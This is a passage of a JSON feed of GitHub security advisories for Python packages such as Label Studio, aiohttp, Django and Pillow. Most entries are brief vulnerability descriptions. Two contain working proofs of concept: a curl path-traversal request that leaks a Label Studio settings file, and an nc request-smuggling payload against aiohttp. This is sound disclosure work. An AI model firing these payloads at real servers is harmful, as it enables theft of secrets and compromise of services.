Advice</h1>\n<p>It is important to note that the hard coded <code>SECRET_KEY</code> has already been removed in Label Studio versions <code>&gt;=1.8.2</code>. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.</p>\n<p>We recommend that Human Signal to release a public disclosure about the hard coded <code>SECRET_KEY</code> to encourage users to patch to a version <code>&gt;=1.8.2</code> to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.</p>\n<h1 id=\"discovered\">Discovered</h1>\n<ul>\n<li>August 2023, Robert Schuh, @robbilie</li>\n<li>August 2023, Alex Brown, elttam</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-f475-x83m-rx5m\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-f475-x83m-rx5m</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/pull/4690\">https://github.com/HumanSignal/label-studio/pull/4690</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/3d06c5131c15600621e08b06f07d976887cde81b\">https://github.com/HumanSignal/label-studio/commit/3d06c5131c15600621e08b06f07d976887cde81b</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/releases/tag/1.8.2\">https://github.com/HumanSignal/label-studio/releases/tag/1.8.2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-43791\">https://nvd.nist.gov/vuln/detail/CVE-2023-43791</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f475-x83m-rx5m\">https://github.com/advisories/GHSA-f475-x83m-rx5m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f475-x83m-rx5m",
            "title": "[label-studio] Label Studio has Hardcoded Django `SECRET_KEY` that can be Abused to Forge Session Tokens",
            "date_modified": "2023-11-09T16:46:26.000Z",
            "date_published": "2023-11-09T14:42:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f475-x83m-rx5m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Dulwich before 0.18.5, when an SSH subprocess is used, allows remote attackers to execute arbitrary commands via an ssh URL with an initial dash character in the hostname, a related issue to CVE-2017-9800, CVE-2017-12836, CVE-2017-12976, CVE-2017-1000116, and CVE-2017-1000117.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-16228\">https://nvd.nist.gov/vuln/detail/CVE-2017-16228</a></li>\n<li><a href=\"https://tracker.debian.org/news/882440\">https://tracker.debian.org/news/882440</a></li>\n<li><a href=\"https://github.com/jelmer/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6\">https://github.com/jelmer/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6</a></li>\n<li><a href=\"https://web.archive.org/web/20201220231743/https://www.dulwich.io/code/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6/\">https://web.archive.org/web/20201220231743/https://www.dulwich.io/code/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6/</a></li>\n<li><a href=\"https://web.archive.org/web/20210128154006/https://www.dulwich.io/code/dulwich/\">https://web.archive.org/web/20210128154006/https://www.dulwich.io/code/dulwich/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cwwh-4382-6fwr\">https://github.com/advisories/GHSA-cwwh-4382-6fwr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cwwh-4382-6fwr",
            "title": "[dulwich] Dulwich RCE Vulnerability",
            "date_modified": "2023-11-09T05:04:06.000Z",
            "date_published": "2022-05-13T01:44:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cwwh-4382-6fwr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The vulnerability resides on the Nginx config file:\n<a href=\"https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\">https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119</a></p>\n<p>The pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash <code>/</code> at the end, the following code shows an example of a safe configuration:</p>\n<pre><code class=\"language-nginx\">location /static/ {\n[...]\n</code></pre>\n<p>The vulnerability works because Nginx will think that <code>/static../</code> is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.</p>\n<p>Of course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)</p>\n<p>** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.</p>\n<pre><code class=\"language-bash\"># Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>The impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/heartexlabs/label-studio/security/advisories/GHSA-cpmr-mw4j-99r7\">https://github.com/heartexlabs/label-studio/security/advisories/GHSA-cpmr-mw4j-99r7</a></li>\n<li><a href=\"https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\">https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/60a3ef57a22c50d7230a56c11d85e14454c99a28\">https://github.com/HumanSignal/label-studio/commit/60a3ef57a22c50d7230a56c11d85e14454c99a28</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cpmr-mw4j-99r7\">https://github.com/advisories/GHSA-cpmr-mw4j-99r7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cpmr-mw4j-99r7",
            "title": "[label-studio] Nginx alias path traversal allows unauthenticated attackers to read all files on /label_studio/core/",
            "date_modified": "2023-11-08T22:39:11.000Z",
            "date_published": "2023-03-24T22:04:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cpmr-mw4j-99r7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Fides web application allows data subject users to request access to their personal data. If the request is approved by the data controller user operating the Fides web application, the data subject's personal data can then retrieved from connected systems and data stores before being bundled together as a data subject access request package for the data subject to download. Supported data formats for the package include json and csv, but the most commonly used format is a series of HTML files compressed in a ZIP file. Once downloaded and unzipped, the data subject user can browse the HTML files on their local machine.</p>\n<p>It was identified that there was no validation of input coming from e.g. the connected systems and data stores which is later reflected in the downloaded data. This can result in an HTML injection that can be abused e.g. for phishing attacks or malicious JavaScript code execution, but only in the context of the data subject's browser accessing a HTML page using the <code>file://</code> protocol.</p>\n<p>Exploitation is limited to rogue Admin UI users, malicious connected system / data store users, and the data subject user if tricked via social engineering into submitting malicious data themselves.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been patched in Fides version <code>TBC</code>. Users are advised to upgrade to this version or later to secure their systems against this threat.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Only Fides deployments which have been configured to use <code>html</code> as the package format in the <a href=\"https://docs.ethyca.com/dev-docs/configuration/privacy-requests/storage-destinations\">storage destination</a> are vulnerable. Using <code>json</code> or <code>csv</code> instead eliminates this vulnerability. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ethyca/fides/security/advisories/GHSA-3vpf-mcj7-5h38\">https://github.com/ethyca/fides/security/advisories/GHSA-3vpf-mcj7-5h38</a></li>\n<li><a href=\"https://github.com/ethyca/fides/commit/50360a0e24aac858459806bb140bb1c4b71e67a1\">https://github.com/ethyca/fides/commit/50360a0e24aac858459806bb140bb1c4b71e67a1</a></li>\n<li><a href=\"https://github.com/ethyca/fides/releases/tag/2.23.3\">https://github.com/ethyca/fides/releases/tag/2.23.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47114\">https://nvd.nist.gov/vuln/detail/CVE-2023-47114</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3vpf-mcj7-5h38\">https://github.com/advisories/GHSA-3vpf-mcj7-5h38</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3vpf-mcj7-5h38",
            "title": "[ethyca-fides] Ethyca Fides HTML Injection Vulnerability in HTML-Formatted DSR Packages",
            "date_modified": "2023-11-09T16:14:12.000Z",
            "date_published": "2023-11-08T17:52:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3vpf-mcj7-5h38"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability has been found in the sviehb/jefferson JFFS2 filesystem extraction tool. This vulnerability affects unknown code of the file <code>src/scripts/jefferson</code>. The manipulation leads to path traversal. The attack can be initiated remotely. Upgrading to version 0.4 is able to address this issue as it includes <a href=\"https://github.com/sviehb/jefferson/commit/53b3f2fc34af0bb32afbcee29d18213e61471d87\">https://github.com/sviehb/jefferson/commit/53b3f2fc34af0bb32afbcee29d18213e61471d87</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-4885\">https://nvd.nist.gov/vuln/detail/CVE-2022-4885</a></li>\n<li><a href=\"https://github.com/sviehb/jefferson/pull/36\">https://github.com/sviehb/jefferson/pull/36</a></li>\n<li><a href=\"https://github.com/sviehb/jefferson/commit/53b3f2fc34af0bb32afbcee29d18213e61471d87\">https://github.com/sviehb/jefferson/commit/53b3f2fc34af0bb32afbcee29d18213e61471d87</a></li>\n<li><a href=\"https://github.com/sviehb/jefferson/releases/tag/v0.4\">https://github.com/sviehb/jefferson/releases/tag/v0.4</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.218020\">https://vuldb.com/?ctiid.218020</a></li>\n<li><a href=\"https://vuldb.com/?id.218020\">https://vuldb.com/?id.218020</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7jrw-p8jc-v6qw\">https://github.com/advisories/GHSA-7jrw-p8jc-v6qw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7jrw-p8jc-v6qw",
            "title": "[jefferson] sviehb/jefferson vulnerable to path traversal",
            "date_modified": "2023-11-07T23:14:25.000Z",
            "date_published": "2023-01-11T18:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7jrw-p8jc-v6qw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in django-photologue up to 3.15.1 and classified as problematic. Affected by this issue is some unknown functionality of the file photologue/templates/photologue/photo_detail.html of the component Default Template Handler. The manipulation of the argument object.caption leads to cross site scripting. The attack may be launched remotely. Upgrading to version 3.16 is able to address this issue. The name of the patch is 960cb060ce5e2964e6d716ff787c72fc18a371e7. It is recommended to apply a patch to fix this issue. VDB-215906 is the identifier assigned to this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-4526\">https://nvd.nist.gov/vuln/detail/CVE-2022-4526</a></li>\n<li><a href=\"https://github.com/richardbarran/django-photologue/issues/223\">https://github.com/richardbarran/django-photologue/issues/223</a></li>\n<li><a href=\"https://github.com/richardbarran/django-photologue/commit/960cb060ce5e2964e6d716ff787c72fc18a371e7\">https://github.com/richardbarran/django-photologue/commit/960cb060ce5e2964e6d716ff787c72fc18a371e7</a></li>\n<li><a href=\"https://vuldb.com/?id.215906\">https://vuldb.com/?id.215906</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django-photologue/PYSEC-2022-43061.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django-photologue/PYSEC-2022-43061.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-287q-jfcp-9vhv\">https://github.com/advisories/GHSA-287q-jfcp-9vhv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-287q-jfcp-9vhv",
            "title": "[django-photologue] django-photologue vulnerable to Cross-site Scripting",
            "date_modified": "2023-11-07T22:16:58.000Z",
            "date_published": "2022-12-15T21:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-287q-jfcp-9vhv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Code injection in <code>paddle.audio.functional.get_window</code> in PaddlePaddle 2.4.0-rc0 allows arbitrary code execution. A <a href=\"https://github.com/PaddlePaddle/Paddle/commit/26c419ca386aeae3c461faf2b828d00b48e908eb\">patch</a> is available on the <code>develop</code> branch of the repository and anticipated to be part of a 2.4 release.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-46742\">https://nvd.nist.gov/vuln/detail/CVE-2022-46742</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2022-002.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2022-002.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/pull/47386\">https://github.com/PaddlePaddle/Paddle/pull/47386</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/26c419ca386aeae3c461faf2b828d00b48e908eb\">https://github.com/PaddlePaddle/Paddle/commit/26c419ca386aeae3c461faf2b828d00b48e908eb</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/paddlepaddle/PYSEC-2022-43063.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/paddlepaddle/PYSEC-2022-43063.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gcjf-29m9-888q\">https://github.com/advisories/GHSA-gcjf-29m9-888q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gcjf-29m9-888q",
            "title": "[PaddlePaddle] PaddlePaddle vulnerable to Code Injection",
            "date_modified": "2023-11-07T22:15:17.000Z",
            "date_published": "2022-12-07T09:30:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gcjf-29m9-888q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The mkdocs 1.2.2 built-in dev-server allows directory traversal using the port 8000, enabling remote exploitation to obtain :sensitive information.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-40978\">https://nvd.nist.gov/vuln/detail/CVE-2021-40978</a></li>\n<li><a href=\"https://github.com/mkdocs/mkdocs/issues/2601\">https://github.com/mkdocs/mkdocs/issues/2601</a></li>\n<li><a href=\"https://github.com/mkdocs/mkdocs\">https://github.com/mkdocs/mkdocs</a></li>\n<li><a href=\"https://github.com/nisdn/CVE-2021-40978/issues/1\">https://github.com/nisdn/CVE-2021-40978/issues/1</a></li>\n<li><a href=\"https://github.com/mkdocs/mkdocs/pull/2604\">https://github.com/mkdocs/mkdocs/pull/2604</a></li>\n<li><a href=\"https://github.com/mkdocs/mkdocs/releases/tag/1.2.3\">https://github.com/mkdocs/mkdocs/releases/tag/1.2.3</a></li>\n<li><a href=\"https://github.com/nisdn/CVE-2021-40978\">https://github.com/nisdn/CVE-2021-40978</a></li>\n<li><a href=\"https://github.com/mkdocs/mkdocs/commit/57540911a0d632674dd23edec765189f96f84f6b\">https://github.com/mkdocs/mkdocs/commit/57540911a0d632674dd23edec765189f96f84f6b</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/mkdocs/PYSEC-2021-878.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/mkdocs/PYSEC-2021-878.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qh9q-34h6-hcv9\">https://github.com/advisories/GHSA-qh9q-34h6-hcv9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qh9q-34h6-hcv9",
            "title": "[mkdocs] Directory traversal in mkdocs",
            "date_modified": "2023-11-07T22:12:37.000Z",
            "date_published": "2021-10-12T18:48:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qh9q-34h6-hcv9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Chameleon (five.pt) in Plone 5.0rc1 through 5.1a1 allows remote authenticated users to bypass Restricted Python by leveraging permissions to create or edit templates.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-4043\">https://nvd.nist.gov/vuln/detail/CVE-2016-4043</a></li>\n<li><a href=\"https://plone.org/security/hotfix/20160419/bypass-restricted-python\">https://plone.org/security/hotfix/20160419/bypass-restricted-python</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/04/20/3\">http://www.openwall.com/lists/oss-security/2016/04/20/3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6h8x-73fx-q2h9\">https://github.com/advisories/GHSA-6h8x-73fx-q2h9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6h8x-73fx-q2h9",
            "title": "[Plone] Chameleon in Plone allows Authentication Bypass",
            "date_modified": "2023-11-07T18:12:29.000Z",
            "date_published": "2022-05-17T02:57:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6h8x-73fx-q2h9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Chameleon (five.pt) in Plone 5.0rc1 through 5.1a1 allows remote authenticated users to bypass Restricted Python by leveraging permissions to create or edit templates.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-4043\">https://nvd.nist.gov/vuln/detail/CVE-2016-4043</a></li>\n<li><a href=\"https://plone.org/security/hotfix/20160419/bypass-restricted-python\">https://plone.org/security/hotfix/20160419/bypass-restricted-python</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/04/20/3\">http://www.openwall.com/lists/oss-security/2016/04/20/3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6h8x-73fx-q2h9\">https://github.com/advisories/GHSA-6h8x-73fx-q2h9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6h8x-73fx-q2h9",
            "title": "[Plone] Chameleon in Plone allows Authentication Bypass",
            "date_modified": "2023-11-07T18:12:29.000Z",
            "date_published": "2022-05-17T02:57:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6h8x-73fx-q2h9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>aiohttp v3.8.4 and earlier are <a href=\"https://github.com/aio-libs/aiohttp/blob/v3.8.4/.gitmodules\">bundled with llhttp v6.0.6</a> which is vulnerable to CVE-2023-30589. The vulnerable code is used by aiohttp for its HTTP request parser when available which is the default case when installing from a wheel.</p>\n<p>This vulnerability only affects users of aiohttp as an HTTP server (ie <code>aiohttp.Application</code>), you are not affected by this vulnerability if you are using aiohttp as an HTTP client library (ie <code>aiohttp.ClientSession</code>).</p>\n<h3 id=\"reproducer\">Reproducer</h3>\n<pre><code class=\"language-python\">from aiohttp import web\n\nasync def example(request: web.Request):\n    headers = dict(request.headers)\n    body = await request.content.read()\n    return web.Response(text=f\"headers: {headers} body: {body}\")\n\napp = web.Application()\napp.add_routes([web.post('/', example)])\nweb.run_app(app)\n</code></pre>\n<p>Sending a crafted HTTP request will cause the server to misinterpret one of the HTTP header values leading to HTTP request smuggling.</p>\n<pre><code class=\"language-console\">$ printf \"POST / HTTP/1.1\\r\\nHost: localhost:8080\\r\\nX-Abc: \\rxTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nA\\r\\n0\\r\\n\\r\\n\" \\\n  | nc localhost 8080\n\nExpected output:\n  headers: {'Host': 'localhost:8080', 'X-Abc': '\\rxTransfer-Encoding: chunked'} body: b''\n\nActual output (note that 'Transfer-Encoding: chunked' is an HTTP header now and body is treated differently)\n  headers: {'Host': 'localhost:8080', 'X-Abc': '', 'Transfer-Encoding': 'chunked'} body: b'A'\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to the latest version of aiohttp to resolve this vulnerability. It has been fixed in v3.8.5: <a href=\"https://pypi.org/project/aiohttp/3.8.5/\"><code>pip install aiohttp &gt;= 3.8.5</code></a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you aren't able to upgrade you can reinstall aiohttp using <code>AIOHTTP_NO_EXTENSIONS=1</code> as an environment variable to disable the llhttp HTTP request parser implementation. The pure Python implementation isn't vulnerable to request smuggling:</p>\n<pre><code class=\"language-console\">$ python -m pip uninstall --yes aiohttp\n$ AIOHTTP_NO_EXTENSIONS=1 python -m pip install --no-binary=aiohttp --no-cache aiohttp\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-30589\">https://nvd.nist.gov/vuln/detail/CVE-2023-30589</a></li>\n<li><a href=\"https://hackerone.com/reports/2001873\">https://hackerone.com/reports/2001873</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-45c4-8wx5-qw6w\">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-45c4-8wx5-qw6w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-37276\">https://nvd.nist.gov/vuln/detail/CVE-2023-37276</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/commit/9337fb3f2ab2b5f38d7e98a194bde6f7e3d16c40\">https://github.com/aio-libs/aiohttp/commit/9337fb3f2ab2b5f38d7e98a194bde6f7e3d16c40</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/commit/9c13a52c21c23dfdb49ed89418d28a5b116d0681\">https://github.com/aio-libs/aiohttp/commit/9c13a52c21c23dfdb49ed89418d28a5b116d0681</a></li>\n<li><a href=\"https://hackerone.com/reports/2001873\">https://hackerone.com/reports/2001873</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/blob/v3.8.4/.gitmodules\">https://github.com/aio-libs/aiohttp/blob/v3.8.4/.gitmodules</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp\">https://github.com/aio-libs/aiohttp</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/aiohttp/PYSEC-2023-120.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/aiohttp/PYSEC-2023-120.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-45c4-8wx5-qw6w\">https://github.com/advisories/GHSA-45c4-8wx5-qw6w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-45c4-8wx5-qw6w",
            "title": "[aiohttp] aiohttp.web.Application vulnerable to HTTP request smuggling via llhttp HTTP request parser",
            "date_modified": "2023-11-06T16:34:20.000Z",
            "date_published": "2023-07-20T14:52:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-45c4-8wx5-qw6w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Pillow before 10.0.0. It is a Denial of Service that uncontrollably allocates memory to process a given task, potentially causing a service to crash by having it run out of memory. This occurs for truetype in ImageFont when textlength in an ImageDraw instance operates on a long text argument.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-44271\">https://nvd.nist.gov/vuln/detail/CVE-2023-44271</a></li>\n<li><a href=\"https://github.com/python-pillow/Pillow/pull/7244\">https://github.com/python-pillow/Pillow/pull/7244</a></li>\n<li><a href=\"https://github.com/python-pillow/Pillow/commit/1fe1bb49c452b0318cad12ea9d97c3bef188e9a7\">https://github.com/python-pillow/Pillow/commit/1fe1bb49c452b0318cad12ea9d97c3bef188e9a7</a></li>\n<li><a href=\"https://devhub.checkmarx.com/cve-details/CVE-2023-44271/\">https://devhub.checkmarx.com/cve-details/CVE-2023-44271/</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2023-227.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2023-227.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8ghj-p4vj-mr35\">https://github.com/advisories/GHSA-8ghj-p4vj-mr35</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8ghj-p4vj-mr35",
            "title": "[pillow] Pillow Denial of Service vulnerability",
            "date_modified": "2023-11-03T19:39:44.000Z",
            "date_published": "2023-11-03T06:36:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8ghj-p4vj-mr35"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Django 3.2 before 3.2.22, 4.1 before 4.1.12, and 4.2 before 4.2.6, the django.utils.text.Truncator chars() and words() methods (when used with html=True) are subject to a potential DoS (denial of service) attack via certain inputs with very long, potentially malformed HTML text. The chars() and words() methods are used to implement the truncatechars_html and truncatewords_html template filters, which are thus also vulnerable. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-43665\">https://nvd.nist.gov/vuln/detail/CVE-2023-43665</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/4.2/releases/security/\">https://docs.djangoproject.com/en/4.2/releases/security/</a></li>\n<li><a href=\"https://groups.google.com/forum/#!forum/django-announce\">https://groups.google.com/forum/#!forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2023/oct/04/security-releases/\">https://www.djangoproject.com/weblog/2023/oct/04/security-releases/</a></li>\n<li><a href=\"https://github.com/django/django/commit/be9c27c4d18c2e6a5be8af4e53c0797440794473\">https://github.com/django/django/commit/be9c27c4d18c2e6a5be8af4e53c0797440794473</a></li>\n<li><a href=\"https://github.com/django/django/commit/c7b7024742250414e426ad49fb80db943e7ba4e8\">https://github.com/django/django/commit/c7b7024742250414e426ad49fb80db943e7ba4e8</a></li>\n<li><a href=\"https://github.com/django/django/commit/ccdade1a0262537868d7ca64374de3d957ca50c5\">https://github.com/django/django/commit/ccdade1a0262537868d7ca64374de3d957ca50c5</a></li>\n<li><a 